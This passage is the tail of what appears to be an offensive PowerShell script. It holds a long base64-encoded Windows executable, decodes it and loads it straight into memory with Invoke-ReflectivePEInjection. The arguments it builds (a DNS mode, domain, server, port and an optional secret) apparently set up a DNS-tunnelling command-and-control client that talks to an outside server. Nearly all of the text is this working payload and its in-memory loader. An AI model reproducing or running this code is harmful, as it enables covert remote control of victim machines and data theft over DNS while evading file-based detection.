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u4q8Cr0KvYq+Cr6Kvwq/irAKwIrBCsGKwgrCisMKw4rECsSKxQrFisYKxorHCseKyArIiskKyYrKCsqKywrLiswKzIrNCs2KzgrOis8Kz4rACtCK0QrRitIK0orQAAAGACAOAAAAAQqRipIKkoqYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKzYrOis+KwIrRitKK04rUitWK1orXitiK2YraituK3Irdit6K34rQiuGK4orjiuSK5YrmiueK6IrpiuqK64rsiu2K7orviuCK8YryivOK9Ir1ivaK94r4ivmK+or7ivyK/Yr+iv+K8AcAIAAAEAAAigGKAooDigSKBYoGigeKCIoJigqKC4oMig2KDooPigCKEYoSihOKFIoVihaKF4oYihmKGoobihyKHYoeih+KEIohiiKKI4okiiWKJooniiiKKYoqiiuKLIotii6KL4ogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inAIACAIwBAADgo/CjAKQQpCCkMKRApFCkYKRwpICkkKSgpLCkwKTQpOCk8KQApRClIKUwpUClUKVgpXClgKWQpaClsKXApdCl4KXwpQCmEKYgpjCmQKZQpmCmcKaAppCmoKawpsCm0KbgpvCmAKcQpyCnMKdAp1CnYKdwp4CnkKegp7CnwKfQp+Cn8KcAqBCoIKgwqECoUKhgqHCogKiQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq6CrsKvAq9Cr4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAK0QrSCtMK1ArVCtYK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvAJACAEwAAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQogDwAgAIAgAAwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipQKlIqVCpWKlgqWipcKl4qYCpiKmQqZipoKmoqbCpuKnAqcip0KnYqeCp6KnwqfipAKoIqhCqGKogqiiqMKo4qkCqSKpQqliqYKpoqnCqeKqAqoiqkKqYqqCqqKqwqriqwKrIqtCq2Krgquiq8Kr4qgCrCKsQqxirIKsoqzCrOKtAq0irUKtYq2CraKtwq3irgKuIq5CrmKugq6irsKu4q8CryKvQq9ir4Kvoq/Cr+KsArAisEKwYrCCsKKwwrDisQKxIrFCsWKxgrGiscKx4rICsiKyQrJisoKyorLCsuKzArMis0KzYrOCs6KzwrPisAK0IrRCtGK0grSitMK04rUCtSK1QrVitYK1orXCteK2ArYitkK2YraCtqK2wrbitwK3IrdCt2K3greit8K34rQCuCK4QrhiuIK4orjCuOK5ArkiuUK5YrmCuaK5wrniugK6IrpCumK6grqiusK64rsCuyK7Qrtiu4K7orvCu+K4ArwivEK8YryCvKK8wrzivQK9Ir1CvWK9gr2ivcK94r4CviK+Qr5ivoK+or7CvuK8AAAMAPAAAAGigcKB4oICgiKA4oUChSKFQoQiiEKIYoiCi2KLgouii8KKoo7CjuKPAo5CkmKSgpKikAAAAEAMAFAAAAEiiYKJoosCiyKLYogBAAwBMAAAAsKH4oRiiOKJYoniiqKLAosii0KIIoxCjIKNYpnCpeKmAqYipkKmYqaCpqKmwqbipyKnQqdip4KnoqfCp+KkAqqCqqKoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$PEBytes = [System.Convert]::FromBase64String($B64exe)
$ARGS = "--dns"
if ($domain -ne [String]::Empty){ $ARGS = $ARGS + " domain=" + $domain}
if ($server -ne [String]::Empty) {$ARGS = $ARGS +" server=" +$server}
if ($port -ne [String]::Empty) {$ARGS = $ARGS +",port=" + $port}
if ($type -ne [String]::Empty) {$ARGS = $ARGS + ",type=" +$type}

if ($secret -ne [String]::Empty) {$ARGS = $ARGS + " --secret=" + $secret}
Else { $ARGS = $ARGS + " --no-encryption" }
Write-Host $secret
Write-Host $ARGS
  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $ARGS
}
